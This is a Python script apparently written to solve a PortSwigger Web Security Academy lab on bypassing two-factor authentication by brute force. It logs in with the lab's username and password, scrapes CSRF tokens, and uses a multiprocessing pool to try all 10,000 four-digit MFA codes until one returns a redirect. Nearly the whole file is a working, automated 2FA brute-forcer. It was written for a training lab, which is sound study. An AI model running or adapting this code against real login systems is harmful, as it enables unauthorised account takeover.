"""
https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack
"""

import sys
import requests
from bs4 import BeautifulSoup
import multiprocessing

def initEvent(event, url):
    """Initializes these global paramaters for all processes in a pool
    Args:
        event (multiprocessing.Event()): flag to set if correct 2FA code is found
        session (requests.Session()): session to launch the requests
        url (string): url to access the webpage initial login
    Returns:
        None: only sets globals
    """
    global is_found
    global login_url

    is_found = event
    login_url = url


def tryCode(code):
    """Attempts to log into a webpage using one 2FA code
    Args:
        code (str): The code that is tested
    Returns:
        None: if code fails or if another thread has found the code
        code (str): successful 2FA code
    """
    # Check if the code is already found
    if is_found.is_set():
        return

    # Create a session to launch the attack
    s = requests.Session()

    # Log into the initial webpage and retrieve the csrf
    try:
        resp = s.get(login_url)
        soup = BeautifulSoup(resp.text,'html.parser')
        csrf = soup.find('input', {'name':'csrf'}).get('value')
    except:
        # print("Bad first csrf get")
        return tryCode(code)
    
    logindata = {
        'csrf' : csrf,
        'username' : 'carlos',
        'password' : 'montoya'
    }

    try:
        # Parse the response from the second webpage for the second csrf
        resp = s.post(login_url, data=logindata)
        soup = BeautifulSoup(resp.text,'html.parser')
        csrf2 = soup.find('input', {'name':'csrf'}).get('value')
    except:
        # print("Bad second csrf get")
        return tryCode(code)
    
    login2_url = f"{login_url}2"
    login2data = {
        'csrf' : csrf2,
        'mfa-code' : code
        }

    if is_found.is_set():
        return
    
    try:
        # Try to log in with the 2FA code
        resp = s.post(login2_url, data=login2data, allow_redirects=False)
        # print(f"logged in with status {resp.status_code}, {login2data}")
    except:
        #print("Bad 2FA attempt")
        return tryCode(code)

    # Print the 2FA code that successfully accessed the account
    if resp.status_code == 302:
        is_found.set()
        print(f"Login succeeded with {code}\nCleaning up leftover processes...")


def tryMultiCodes(login_url, codes_to_try, num_processes):
    """Creates a pool of processes to test the 2FA codes concurrently.
    Args:
        s (requests.Session()): The session to launch the requests from
        login_url (str): url to access the webpage initial login
        codes_to_try (list[str]): List of codes from 0000-9999
        num_processes (int): The number of processes to spawn for the pool
    Returns:
        None
    """
    # Create an event that will trigger when the correct code is found
    # Initialize each processs with the global variables
    is_found = multiprocessing.Event()
    p=multiprocessing.Pool(num_processes, initEvent, (is_found, login_url, ))
    p.map(tryCode, codes_to_try)
    p.close


if __name__=="__main__":
    # Pull the url from the first argument
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
    login_url = f'https://{site}/login'

    # Brute force the 2FA with a list of codes from 0000-9999
    codes = map(str, range(10000))
    codes = [x.zfill(4) for x in codes]

    # Set the number of workers based on CPU cores
    workers = multiprocessing.cpu_count() * 4
    tryMultiCodes(login_url, codes, workers)